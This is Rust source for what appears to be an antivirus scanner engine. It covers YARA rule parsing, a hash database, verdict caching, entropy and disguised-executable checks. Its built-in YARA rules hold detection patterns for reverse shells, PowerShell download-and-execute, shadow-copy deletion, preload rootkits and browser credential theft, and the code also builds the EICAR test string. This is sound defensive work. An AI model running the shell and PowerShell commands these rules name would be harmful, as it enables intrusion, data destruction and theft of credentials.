use crate::quarantine;
use crate::realtime_shield;
use crate::threat_intel_and_net;
use base64::Engine;
use chrono::{DateTime, Utc};
use flate2::read::{DeflateDecoder, GzDecoder, ZlibDecoder};
use lru::LruCache;
use once_cell::sync::Lazy;
use regex::Regex;
use rusqlite::{params, Connection};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{Read, Seek, SeekFrom};
use std::num::NonZeroUsize;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex, RwLock};
use uuid::Uuid;
use walkdir::WalkDir;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatDetection {
    pub id: String,
    pub file_path: String,
    pub threat_name: String,
    pub category: String,
    pub severity: String, // "Critical", "High", "Medium"
    pub sha256: String,
    pub entropy: f64,
    pub detection_engine: String,
    pub detected_at: DateTime<Utc>,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanReport {
    pub scan_id: String,
    pub scan_type: String,
    pub scanned_files: usize,
    pub skipped_files: usize,
    pub duration_ms: u128,
    pub detections: Vec<ThreatDetection>,
    pub completed_at: DateTime<Utc>,
}

/// Mail Gateway & RFC 5322 `.eml`/`.mbox` inspection report.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EmailGatewayReport {
    pub safe: bool,
    pub verdict: String, // "CLEAN", "REJECT_MALWARE", "QUARANTINE_PHISHING", "SUSPICIOUS_AUTH"
    pub risk_score: u8,
    pub sender_from: String,
    pub reply_to: String,
    pub return_path: String,
    pub subject: String,
    pub spf_status: String,
    pub dkim_status: String,
    pub dmarc_status: String,
    pub attachments_inspected: usize,
    pub urls_inspected: usize,
    pub threat_name: Option<String>,
    pub severity: String,
    pub findings: Vec<String>,
}

/// Verdict cached in the in-memory LRU cache keyed by `(device_id, inode_or_file_index, mtime_secs, file_size)`.
#[derive(Debug, Clone)]
pub enum ScanVerdict {
    Clean,
    Malicious(ThreatDetection),
}

type VerdictCacheKey = (u64, u64, i64, u64);

/// Sub-pattern belonging to a compiled pure-Rust YARA rule.
#[derive(Debug, Clone)]
pub enum YaraSubPattern {
    Text(Regex),
    Bytes(regex::bytes::Regex),
}

impl YaraSubPattern {
    fn is_match(&self, text: &str, raw: &[u8]) -> bool {
        match self {
            YaraSubPattern::Text(re) => re.is_match(text),
            YaraSubPattern::Bytes(re) => re.is_match(raw),
        }
    }
}

/// Compiled pure-Rust YARA rule loaded from built-in definitions or `.yar` files in `rules/`.
#[derive(Debug, Clone)]
pub struct CompiledYaraRule {
    pub name: String,
    pub category: String,
    pub severity: String,
    pub description: String,
    pub patterns: Vec<YaraSubPattern>,
    pub min_matches: usize,
}

impl CompiledYaraRule {
    /// Returns true when at least `min_matches` sub-patterns match `text` or `raw`.
    pub fn matches(&self, text: &str, raw: &[u8]) -> bool {
        if self.patterns.is_empty() || self.min_matches == 0 {
            return false;
        }
        let mut hits = 0usize;
        for pat in &self.patterns {
            if pat.is_match(text, raw) {
                hits += 1;
                if hits >= self.min_matches {
                    return true;
                }
            }
        }
        false
    }
}

/// Thread-safe enterprise scanner engine holding compiled YARA rules and SQLite database path.
pub struct ScannerEngine {
    pub yara_rules: Vec<CompiledYaraRule>,
    pub rules_dir: PathBuf,
    pub db_path: PathBuf,
}

/// Max file size inspected (keeps scans fast and memory low).
const MAX_FILE_BYTES: u64 = 64 * 1024 * 1024;
/// Bytes of file head kept for heuristic/YARA/entropy/archive analysis.
const CONTENT_WINDOW: usize = 2 * 1024 * 1024;
/// Trailing overlay window appended when files exceed `CONTENT_WINDOW`.
const TAIL_WINDOW: usize = 64 * 1024;
/// Recursion limit for nested archive, document, and obfuscation layers.
const MAX_ARCHIVE_DEPTH: u8 = 3;
/// Maximum member entries inspected per archive or PDF container.
const MAX_ARCHIVE_ENTRIES: usize = 64;
/// Maximum uncompressed size allowed per container member (anti-ZipBomb guard).
const MAX_MEMBER_UNPACK_BYTES: usize = 8 * 1024 * 1024;
/// Maximum compression expansion ratio permitted before flagging ZipBomb.
const MAX_COMPRESSION_RATIO: usize = 100;
/// SHA-256 digest of a zero-byte file (must never be treated as malware).
const EMPTY_FILE_SHA256: &str = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
/// Backoff window (seconds) after local clamd socket connection failure.
const CLAMD_COOLDOWN_SECS: u64 = 60;
static LAST_CLAMD_FAIL_EPOCH_SECS: AtomicU64 = AtomicU64::new(0);

/// Default YARA rules materialized into `rules/genesis_core_rules.yar`.
const DEFAULT_CORE_YARA_FILE: &str = r#"
rule YARA_ReverseShell_NetworkPipe {
    meta:
        category = "Backdoor.Shell"
        severity = "Critical"
        description = "Interactive reverse shell command sequence capable of granting remote unauthorized control."
    strings:
        $re = /(bash\s+-i\s+>&\s*\/dev\/tcp\/|nc(at)?\s+-e\s+\/bin\/(ba)?sh|Invoke-PowerShellTcp|socat\s+TCP4?.*EXEC:)/i
    condition:
        any of them
}

rule YARA_PowerShell_ObfuscatedDropper {
    meta:
        category = "Trojan.Dropper"
        severity = "Critical"
        description = "Obfuscated or fileless PowerShell execution pattern commonly used by staging droppers."
    strings:
        $re = /(powershell.*\s-(e|enc|encodedcommand)\s+[A-Za-z0-9+\/=]{24,}|IEX\s*\(\s*New-Object\s+Net\.WebClient\)\.DownloadString|FromBase64String.*Invoke-Expression)/i
    condition:
        any of them
}

rule YARA_Ransomware_ShadowCopyWipe {
    meta:
        category = "Ransomware.Behavior"
        severity = "Critical"
        description = "Attempts to inhibit system recovery by deleting Volume Shadow Copies or backup catalogs."
    strings:
        $re = /(vssadmin(\.exe)?\s+delete\s+shadows|wmic(\.exe)?\s+shadowcopy\s+delete|wbadmin\s+delete\s+catalog|bcdedit.*recoveryenabled\s+no)/i
    condition:
        any of them
}

rule YARA_CryptoMiner_StratumPool {
    meta:
        category = "Riskware.CryptoMiner"
        severity = "High"
        description = "Unauthorized cryptocurrency mining pool protocol or configuration signature."
    strings:
        $re = /(stratum\+(tcp|ssl):\/\/|donate-level.*xmrig|pool\.minexmr\.com|nanopool\.org)/i
    condition:
        any of them
}

rule YARA_Linux_StealthPreload_Rootkit {
    meta:
        category = "Rootkit.Linux"
        severity = "Critical"
        description = "Linux shared-library hijacking via ld.so.preload or a preload library in a volatile directory."
    strings:
        $re = /(>>?\s*\/etc\/ld\.so\.preload|LD_PRELOAD\s*=\s*\/(tmp|dev\/shm|var\/tmp)\/)/i
    condition:
        any of them
}

rule YARA_CredentialStealer_BrowserDB {
    meta:
        category = "Spyware.Infostealer"
        severity = "Critical"
        description = "Targets browser credential databases and master decryption keys (Infostealer behavior)."
    strings:
        $re = /(Login Data.{0,400}Local State.{0,400}CryptUnprotectData|cookies\.sqlite.{0,400}key4\.db.{0,400}logins\.json)/is
    condition:
        any of them
}

rule YARA_Python_ObfuscatedExec {
    meta:
        category = "Trojan.PythonDropper"
        severity = "High"
        description = "Obfuscated Python exec/marshal/base64 stage-loader payload."
    strings:
        $re = /(exec\s*\(\s*__import__\s*\(\s*['"]base64['"]\s*\)\.b64decode|marshal\.loads\s*\(\s*zlib\.decompress)/i
    condition:
        any of them
}
"#;

const BUNDLED_ENTERPRISE_YARA: &str = include_str!("../../rules/default_enterprise.yar");
const BUNDLED_RISKWARE_YARA: &str = include_str!("../../rules/riskware_and_repack.yar");
const BUNDLED_SENTINEL_YARA: &str = include_str!("../../rules/cve_sentinel_heuristics.yar");

/// The EICAR test string is assembled at runtime from two halves so the literal never
/// appears in our source or compiled binary.
pub fn eicar_test_string() -> String {
    [
        r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-",
        "STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    ]
    .concat()
}

static KNOWN_HASHES: Lazy<HashMap<&'static str, (&'static str, &'static str, &'static str)>> =
    Lazy::new(|| {
        let mut m = HashMap::new();
        m.insert(
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            ("EICAR-Standard-AV-Test-Signature", "Test.Signature", "High"),
        );
        m.insert(
            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
            ("Ransom.WannaCry.Gen", "Ransomware", "Critical"),
        );
        m
    });

/// Global LRU Verdict Cache keyed by `(device_id, inode_or_file_index, mtime_secs, file_size)`.
static VERDICT_CACHE: Lazy<Mutex<LruCache<VerdictCacheKey, ScanVerdict>>> = Lazy::new(|| {
    Mutex::new(LruCache::new(NonZeroUsize::new(16_384).unwrap()))
});

/// Global thread-safe `Arc<RwLock<ScannerEngine>>` initialized on startup.
pub static SCANNER_ENGINE: Lazy<Arc<RwLock<ScannerEngine>>> = Lazy::new(|| {
    let rules_dir = rules_directory();
    let db_path = sqlite_db_path();
    init_sqlite_db(&db_path);
    ensure_default_yara_files(&rules_dir);
    let yara_rules = load_yara_rules_from_dir(&rules_dir);
    Arc::new(RwLock::new(ScannerEngine {
        yara_rules,
        rules_dir,
        db_path,
    }))
});

pub fn rules_directory() -> PathBuf {
    let dir = realtime_shield::app_config_dir().join("rules");
    let _ = fs::create_dir_all(&dir);
    dir
}

pub fn sqlite_db_path() -> PathBuf {
    realtime_shield::app_config_dir().join("threat_hashes.db")
}

fn is_valid_sha256_hex(sha: &str) -> bool {
    sha.len() == 64 && sha.bytes().all(|b| b.is_ascii_hexdigit())
}

fn ensure_healthy_sqlite_connection(db_path: &Path) -> Option<Connection> {
    let existed = db_path.exists();
    if let Ok(conn) = Connection::open(db_path) {
        if existed {
            let intact = conn
                .query_row("PRAGMA quick_check;", [], |r| r.get::<_, String>(0))
                .map(|res| res.trim().eq_ignore_ascii_case("ok"))
                .unwrap_or(false);
            if intact {
                return Some(conn);
            }
            drop(conn);
            let _ = fs::remove_file(db_path);
            let _ = fs::remove_file(format!("{}-wal", db_path.display()));
            let _ = fs::remove_file(format!("{}-shm", db_path.display()));
        } else {
            return Some(conn);
        }
    }
    Connection::open(db_path).ok()
}

pub(crate) fn init_sqlite_db(db_path: &Path) {
    if let Some(conn) = ensure_healthy_sqlite_connection(db_path) {
        let _ = conn.execute_batch(
            "PRAGMA journal_mode = WAL;
             PRAGMA synchronous = NORMAL;
             CREATE TABLE IF NOT EXISTS threat_hashes (
                 sha256 TEXT PRIMARY KEY,
                 threat_name TEXT NOT NULL,
                 category TEXT NOT NULL,
                 severity TEXT NOT NULL,
                 updated_at TEXT NOT NULL
             ) WITHOUT ROWID;",
        );
        let now = Utc::now().to_rfc3339();
        for (&sha, &(name, cat, sev)) in KNOWN_HASHES.iter() {
            let _ = conn.execute(
                "INSERT OR IGNORE INTO threat_hashes (sha256, threat_name, category, severity, updated_at)
                 VALUES (?1, ?2, ?3, ?4, ?5)",
                params![sha, name, cat, sev, now],
            );
        }
    }
}

/// Fast $O(1)$ PRIMARY KEY lookup in local SQLite `threat_hashes.db`.
pub fn lookup_sqlite_hash(sha256: &str) -> Option<(String, String, String)> {
    let db_path = sqlite_db_path();
    let conn = Connection::open(db_path).ok()?;
    let mut stmt = conn
        .prepare_cached(
            "SELECT threat_name, category, severity FROM threat_hashes WHERE sha256 = ?1 LIMIT 1",
        )
        .ok()?;
    stmt.query_row(params![sha256], |row| {
        Ok((
            row.get::<_, String>(0)?,
            row.get::<_, String>(1)?,
            row.get::<_, String>(2)?,
        ))
    })
    .ok()
}

/// Batch-insert validated SHA-256 malware signatures into an explicit SQLite DB path.
pub(crate) fn batch_insert_threat_hashes_at(
    db_path: &Path,
    entries: &[(String, String, String, String)],
) -> usize {
    init_sqlite_db(db_path);
    let Ok(mut conn) = Connection::open(db_path) else {
        return 0;
    };
    let Ok(tx) = conn.transaction() else {
        return 0;
    };
    let now = Utc::now().to_rfc3339();
    let mut inserted = 0usize;
    {
        if let Ok(mut stmt) = tx.prepare(
            "INSERT OR REPLACE INTO threat_hashes (sha256, threat_name, category, severity, updated_at)
             VALUES (?1, ?2, ?3, ?4, ?5)",
        ) {
            for (sha, name, cat, sev) in entries {
                let clean = sha.trim().to_ascii_lowercase();
                if !is_valid_sha256_hex(&clean)
                    || clean == EMPTY_FILE_SHA256
                    || quarantine::is_allowlisted(&clean)
                {
                    continue;
                }
                if stmt.execute(params![clean, name, cat, sev, now]).is_ok() {
                    inserted += 1;
                }
            }
        }
    }
    let _ = tx.commit();
    inserted
}

/// Batch-insert SHA-256 malware signatures into `threat_hashes.db` inside a single transaction.
pub fn batch_insert_threat_hashes(entries: &[(String, String, String, String)]) -> usize {
    let db_path = sqlite_db_path();
    batch_insert_threat_hashes_at(&db_path, entries)
}

pub fn sqlite_hash_count() -> usize {
    let db_path = sqlite_db_path();
    if let Ok(conn) = Connection::open(db_path) {
        if let Ok(count) = conn.query_row("SELECT COUNT(*) FROM threat_hashes", [], |r| r.get::<_, i64>(0)) {
            return count.max(0) as usize;
        }
    }
    KNOWN_HASHES.len()
}

fn ensure_default_yara_files(rules_dir: &Path) {
    let bundled_files = [
        ("genesis_core_rules.yar", DEFAULT_CORE_YARA_FILE),
        ("default_enterprise.yar", BUNDLED_ENTERPRISE_YARA),
        ("riskware_and_repack.yar", BUNDLED_RISKWARE_YARA),
        ("cve_sentinel_heuristics.yar", BUNDLED_SENTINEL_YARA),
    ];
    for (filename, contents) in &bundled_files {
        let target = rules_dir.join(filename);
        let _ = fs::write(target, contents.trim());
    }

    // Copy any additional custom .yar rule files from relative rules folders
    for rel in &["rules", "../rules", "../../rules"] {
        let rel_p = PathBuf::from(rel);
        if rel_p.is_dir() {
            if let Ok(entries) = fs::read_dir(rel_p) {
                for entry in entries.flatten() {
                    let p = entry.path();
                    let ext = p.extension().and_then(|e| e.to_str()).unwrap_or("");
                    if ext.eq_ignore_ascii_case("yar") || ext.eq_ignore_ascii_case("yara") {
                        let dest = rules_dir.join(entry.file_name());
                        if !dest.exists() {
                            let _ = fs::copy(&p, &dest);
                        }
                    }
                }
            }
        }
    }
}

fn unescape_yara_literal(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut chars = raw.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('\\') => out.push('\\'),
                Some('"') => out.push('"'),
                Some('n') => out.push('\n'),
                Some('r') => out.push('\r'),
                Some('t') => out.push('\t'),
                Some(other) => {
                    out.push('\\');
                    out.push(other);
                }
                None => out.push('\\'),
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn compile_hex_yara_pattern(hex_body: &str) -> Option<YaraSubPattern> {
    let compact: String = hex_body
        .chars()
        .filter(|c| !c.is_ascii_whitespace())
        .collect();
    if compact.len() < 4 || compact.len() % 2 != 0 {
        return None;
    }
    let mut pat = String::with_capacity(compact.len() * 2);
    let bytes = compact.as_bytes();
    for pair in bytes.chunks_exact(2) {
        let a = pair[0] as char;
        let b = pair[1] as char;
        if a == '?' && b == '?' {
            pat.push('.');
        } else if a.is_ascii_hexdigit() && b.is_ascii_hexdigit() {
            pat.push_str(&format!("\\x{}{}", a.to_ascii_lowercase(), b.to_ascii_lowercase()));
        } else {
            return None;
        }
    }
    regex::bytes::RegexBuilder::new(&pat)
        .unicode(false)
        .dot_matches_new_line(true)
        .build()
        .ok()
        .map(YaraSubPattern::Bytes)
}

/// Extract `(rule_name, rule_body)` blocks from YARA source using brace-depth matching
/// so inner hex byte definitions (`{ 18 a0 22 00 }`) never truncate rule bodies early.
fn extract_yara_rule_blocks(src: &str) -> Vec<(String, String)> {
    static RULE_HEAD_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?m)^\s*rule\s+([A-Za-z0-9_]+)\s*\{").unwrap());

    let bytes = src.as_bytes();
    let mut blocks = Vec::new();
    let mut search_pos = 0usize;

    while let Some(m) = RULE_HEAD_RE.find_at(src, search_pos) {
        let Some(cap) = RULE_HEAD_RE.captures(&src[m.start()..m.end()]) else {
            break;
        };
        let name = cap[1].to_string();
        let body_start = m.end();
        let mut i = body_start;
        let mut depth = 1usize;

        while i < bytes.len() && depth > 0 {
            let b = bytes[i];
            if b == b'/' && bytes.get(i + 1) == Some(&b'/') {
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
                continue;
            }
            if b == b'=' {
                i += 1;
                while i < bytes.len() && matches!(bytes[i], b' ' | b'\t') {
                    i += 1;
                }
                if bytes.get(i) == Some(&b'/') {
                    i += 1;
                    while i < bytes.len() && bytes[i] != b'\n' {
                        if bytes[i] == b'\\' {
                            i += 2;
                            continue;
                        }
                        if bytes[i] == b'/' {
                            i += 1;
                            break;
                        }
                        i += 1;
                    }
                    continue;
                }
                if bytes.get(i) == Some(&b'"') {
                    i += 1;
                    while i < bytes.len() && bytes[i] != b'\n' {
                        if bytes[i] == b'\\' {
                            i += 2;
                            continue;
                        }
                        if bytes[i] == b'"' {
                            i += 1;
                            break;
                        }
                        i += 1;
                    }
                    continue;
                }
                continue;
            }
            if b == b'{' {
                depth += 1;
            } else if b == b'}' {
                depth -= 1;
                if depth == 0 {
                    blocks.push((name.clone(), src[body_start..i].to_string()));
                    i += 1;
                    break;
                }
            }
            i += 1;
        }
        search_pos = i.max(m.end() + 1);
    }
    blocks
}

/// Compile one or more YARA rule definitions from text into `CompiledYaraRule` entries.
pub(crate) fn parse_yara_rules_from_source(src: &str, out: &mut Vec<CompiledYaraRule>) {
    static META_CAT_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"category\s*=\s*"([^"]+)""#).unwrap());
    static META_SEV_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"severity\s*=\s*"([^"]+)""#).unwrap());
    static META_DESC_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"description\s*=\s*"([^"]+)""#).unwrap());
    static REGEX_STR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r"(?m)^\s*\$[A-Za-z0-9_]+\s*=\s*/(.+)/([is]*)(?:[ \t]+(?:ascii|wide|nocase|fullword))*(?:[ \t]+//.*)?\r?$",
        )
        .unwrap()
    });
    static LITERAL_STR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?m)^\s*\$[A-Za-z0-9_]+\s*=\s*"((?:\\.|[^"\\]){2,})"(?:[ \t]+(?:nocase|ascii|wide|fullword))*(?:[ \t]+//.*)?\r?$"#)
            .unwrap()
    });
    static HEX_STR_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?s)\$[A-Za-z0-9_]+\s*=\s*\{\s*([0-9A-Fa-f?\s]+?)\s*\}").unwrap());
    static HIGH_HEX_ESC_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"\\x[89a-fA-F][0-9a-fA-F]").unwrap());
    static COND_ALL_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)\ball\s+of\s+them\b").unwrap());
    static COND_NUM_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?i)\b(\d+)\s+of\s+them\b").unwrap());

    for (name, body) in extract_yara_rule_blocks(src) {
        let category = META_CAT_RE
            .captures(&body)
            .map(|c| c[1].to_string())
            .unwrap_or_else(|| "YARA.Heuristic".to_string());
        let severity = META_SEV_RE
            .captures(&body)
            .map(|c| c[1].to_string())
            .unwrap_or_else(|| "High".to_string());
        let description = META_DESC_RE
            .captures(&body)
            .map(|c| c[1].to_string())
            .unwrap_or_else(|| format!("Matched YARA rule {}", name));

        let (strings_section, cond_section) = match body.rfind("condition:") {
            Some(idx) => (&body[..idx], &body[idx..]),
            None => (body.as_str(), ""),
        };

        let mut patterns = Vec::new();
        for rcap in REGEX_STR_RE.captures_iter(strings_section) {
            let pat = &rcap[1];
            let flags = &rcap[2];
            let has_s = flags.contains('s');
            let has_i = flags.contains('i') || !has_s;
            if HIGH_HEX_ESC_RE.is_match(pat) {
                if let Ok(re) = regex::bytes::RegexBuilder::new(pat)
                    .unicode(false)
                    .case_insensitive(has_i)
                    .dot_matches_new_line(has_s)
                    .build()
                {
                    patterns.push(YaraSubPattern::Bytes(re));
                }
            } else {
                let prefix = if has_i && has_s {
                    "(?is)"
                } else if has_s {
                    "(?s)"
                } else {
                    "(?i)"
                };
                if let Ok(re) = Regex::new(&format!("{}(?:{})", prefix, pat)) {
                    patterns.push(YaraSubPattern::Text(re));
                }
            }
        }
        for lcap in LITERAL_STR_RE.captures_iter(strings_section) {
            let unescaped = unescape_yara_literal(&lcap[1]);
            let lit = regex::escape(&unescaped);
            if let Ok(re) = Regex::new(&format!("(?i)(?:{})", lit)) {
                patterns.push(YaraSubPattern::Text(re));
            }
        }
        for hcap in HEX_STR_RE.captures_iter(strings_section) {
            if let Some(sub) = compile_hex_yara_pattern(&hcap[1]) {
                patterns.push(sub);
            }
        }

        if patterns.is_empty() {
            continue;
        }
        let min_matches = if COND_ALL_RE.is_match(cond_section) {
            patterns.len()
        } else if let Some(ncap) = COND_NUM_RE.captures(cond_section) {
            ncap[1]
                .parse::<usize>()
                .unwrap_or(1)
                .clamp(1, patterns.len())
        } else {
            1
        };

        if !out.iter().any(|r| r.name == name) {
            out.push(CompiledYaraRule {
                name,
                category,
                severity,
                description,
                patterns,
                min_matches,
            });
        }
    }
}

/// Parse `.yar` / `.yara` rule files from `rules/` into `CompiledYaraRule` patterns.
pub fn load_yara_rules_from_dir(rules_dir: &Path) -> Vec<CompiledYaraRule> {
    let mut rules = Vec::new();
    let mut raw_sources = vec![
        DEFAULT_CORE_YARA_FILE.to_string(),
        BUNDLED_ENTERPRISE_YARA.to_string(),
        BUNDLED_RISKWARE_YARA.to_string(),
        BUNDLED_SENTINEL_YARA.to_string(),
    ];

    if let Ok(entries) = fs::read_dir(rules_dir) {
        for entry in entries.flatten() {
            let p = entry.path();
            let ext = p.extension().and_then(|e| e.to_str()).unwrap_or("");
            let fname = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if (ext.eq_ignore_ascii_case("yar") || ext.eq_ignore_ascii_case("yara"))
                && fname != "genesis_core_rules.yar"
                && fname != "default_enterprise.yar"
                && fname != "riskware_and_repack.yar"
                && fname != "cve_sentinel_heuristics.yar"
            {
                if let Ok(text) = fs::read_to_string(&p) {
                    raw_sources.push(text);
                }
            }
        }
    }

    for src in &raw_sources {
        parse_yara_rules_from_source(src, &mut rules);
    }

    rules
}

/// Hot-reload `.yar` files from `rules/` into the global `SCANNER_ENGINE` and clear the LRU cache.
pub fn reload_yara_rules() -> usize {
    let dir = rules_directory();
    ensure_default_yara_files(&dir);
    let loaded = load_yara_rules_from_dir(&dir);
    let count = loaded.len();
    if let Ok(mut eng) = SCANNER_ENGINE.write() {
        eng.yara_rules = loaded;
    }
    if let Ok(mut cache) = VERDICT_CACHE.lock() {
        cache.clear();
    }
    count
}

pub fn builtin_hash_count() -> usize {
    sqlite_hash_count().max(KNOWN_HASHES.len())
}

pub fn heuristic_rule_count() -> usize {
    let yara_len = SCANNER_ENGINE
        .read()
        .map(|e| e.yara_rules.len())
        .unwrap_or(7);
    // +4 for EICAR, double-extension, disguised ELF/PE magic header, and UPX/entropy analyzer
    yara_len + 4
}

static DOUBLE_EXT_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\.(pdf|doc|docx|xls|xlsx|jpg|jpeg|png|txt|mp4|zip)\.(exe|scr|bat|cmd|vbs|ps1|js|hta|com|pif)$").unwrap()
});

/// Compute the 4-tuple cache key `(device_id, inode_or_file_index, mtime_secs, file_size)` for $O(1)$ LRU lookups.
fn file_cache_key(path: &Path, metadata: &fs::Metadata) -> VerdictCacheKey {
    let file_size = metadata.len();
    let mtime_secs = metadata
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);

    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        return (metadata.dev(), metadata.ino(), mtime_secs, file_size);
    }

    #[cfg(not(unix))]
    {
        // Fast 64-bit FNV-1a path hash + creation time on Windows
        let created_ticks = metadata
            .created()
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0);
        let mut hash: u64 = 0xcbf29ce484222325;
        for b in path.to_string_lossy().as_bytes() {
            hash ^= b.to_ascii_lowercase() as u64;
            hash = hash.wrapping_mul(0x100000001b3);
        }
        (created_ticks, hash, mtime_secs, file_size)
    }
}

/// Explicitly record a `Clean` verdict in the LRU cache for a verified executable path.
pub fn cache_clean_verdict(path: &Path) {
    if let Ok(meta) = fs::metadata(path) {
        let key = file_cache_key(path, &meta);
        if let Ok(mut cache) = VERDICT_CACHE.lock() {
            cache.put(key, ScanVerdict::Clean);
        }
    }
}

/// Check if a file is already verified `Clean` in the LRU Verdict Cache.
pub fn is_cached_clean(path: &Path) -> bool {
    let Ok(meta) = fs::metadata(path) else {
        return false;
    };
    let key = file_cache_key(path, &meta);
    if let Ok(mut cache) = VERDICT_CACHE.lock() {
        return matches!(cache.get(&key), Some(ScanVerdict::Clean));
    }
    false
}

/// Detect non-executable document/media extensions hiding raw PE (`MZ`) or Linux (`\x7fELF`) binaries.
fn is_disguised_executable_header(path: &Path, head: &[u8]) -> Option<&'static str> {
    let ext = path
        .extension()
        .map(|e| e.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let is_doc_or_media = matches!(
        ext.as_str(),
        "txt" | "pdf" | "jpg" | "jpeg" | "png" | "gif" | "svg" | "doc" | "docx" | "xls" | "xlsx" | "mp3" | "mp4" | "csv"
    );
    if !is_doc_or_media {
        return None;
    }
    if head.starts_with(b"MZ") {
        Some("Windows PE (MZ) executable disguised with document/media extension")
    } else if head.starts_with(b"\x7fELF") {
        Some("Linux ELF binary disguised with document/media extension")
    } else {
        None
    }
}

/// Detect POSIX/USTAR tar archives (`ustar` magic at offset 257).
fn is_tar_buffer(head: &[u8]) -> bool {
    head.len() >= 263 && &head[257..262] == b"ustar"
}

fn is_content_scannable(path: &Path, head: &[u8]) -> bool {
    if head.starts_with(b"#!")
        || head.starts_with(b"MZ")
        || head.starts_with(b"\x7fELF")
        || head.starts_with(b"PK\x03\x04")
        || head.starts_with(b"\x1f\x8b")
        || head.starts_with(b"%PDF-")
        || head.starts_with(b"\xD0\xCF\x11\xE0")
        || head.starts_with(b"{\\rtf")
        || head.starts_with(&[0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00])
        || is_tar_buffer(head)
    {
        return true;
    }
    let ext = path
        .extension()
        .map(|e| e.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    matches!(
        ext.as_str(),
        "sh" | "bash" | "zsh" | "ps1" | "psm1" | "bat" | "cmd" | "vbs" | "vbe" | "js" | "jse"
            | "hta" | "wsf" | "py" | "pl" | "desktop" | "service" | "exe" | "dll" | "scr"
            | "com" | "so" | "appimage" | "elf" | "bin" | "url" | "theme" | "website"
            | "msg" | "eml" | "mbox" | "oft" | "rtf" | "zip" | "jar" | "apk" | "xpi" | "tar"
            | "gz" | "tgz" | "pdf" | "doc" | "docx" | "docm" | "xls" | "xlsx" | "xlsm"
            | "ppt" | "pptx" | "pptm" | "lnk" | "iso" | "vhd"
    )
}

/// Calculate Shannon entropy (0.0 to 8.0 bits per byte) of a byte slice.
pub fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = (count as f64) / len;
            entropy -= p * p.log2();
        }
    }
    (entropy * 100.0).round() / 100.0
}

fn hash_and_sample(path: &Path) -> Option<(String, Vec<u8>)> {
    let mut file = File::open(path).ok()?;
    let mut hasher = Sha256::new();
    let mut head = Vec::with_capacity(64 * 1024);
    let mut chunk = vec![0u8; 64 * 1024];
    let mut total_bytes = 0u64;
    loop {
        let n = file.read(&mut chunk).ok()?;
        if n == 0 {
            break;
        }
        total_bytes += n as u64;
        hasher.update(&chunk[..n]);
        if head.len() < CONTENT_WINDOW {
            let take = std::cmp::min(n, CONTENT_WINDOW - head.len());
            head.extend_from_slice(&chunk[..take]);
        }
    }
    if total_bytes > CONTENT_WINDOW as u64 {
        let tail_len = std::cmp::min(TAIL_WINDOW, (total_bytes - CONTENT_WINDOW as u64) as usize);
        if tail_len > 0 && file.seek(SeekFrom::End(-(tail_len as i64))).is_ok() {
            let mut tail = vec![0u8; tail_len];
            if file.read_exact(&mut tail).is_ok() {
                head.extend_from_slice(&tail);
            }
        }
    }
    Some((hex::encode(hasher.finalize()), head))
}

/// Compute the full-file SHA-256 hash without uploading or retaining file contents.
pub fn compute_file_sha256(path: &Path) -> Option<String> {
    hash_and_sample(path).map(|(sha, _)| sha)
}

fn detection(
    path: &str,
    sha256: &str,
    entropy: f64,
    name: &str,
    category: &str,
    severity: &str,
    engine: &str,
    description: String,
) -> ThreatDetection {
    ThreatDetection {
        id: Uuid::new_v4().to_string(),
        file_path: path.to_string(),
        threat_name: name.to_string(),
        category: category.to_string(),
        severity: severity.to_string(),
        sha256: sha256.to_string(),
        entropy,
        detection_engine: engine.to_string(),
        detected_at: Utc::now(),
        description,
    }
}

fn unix_epoch_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn stream_to_clamd<S: Read + std::io::Write>(
    mut sock: S,
    data: &[u8],
) -> Result<Option<String>, std::io::Error> {
    sock.write_all(b"zINSTREAM\0")?;
    for chunk in data.chunks(32 * 1024) {
        let len_be = (chunk.len() as u32).to_be_bytes();
        sock.write_all(&len_be)?;
        sock.write_all(chunk)?;
    }
